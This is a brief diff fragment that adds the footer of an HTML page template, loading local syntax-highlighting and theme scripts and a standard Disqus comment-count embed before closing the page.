+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
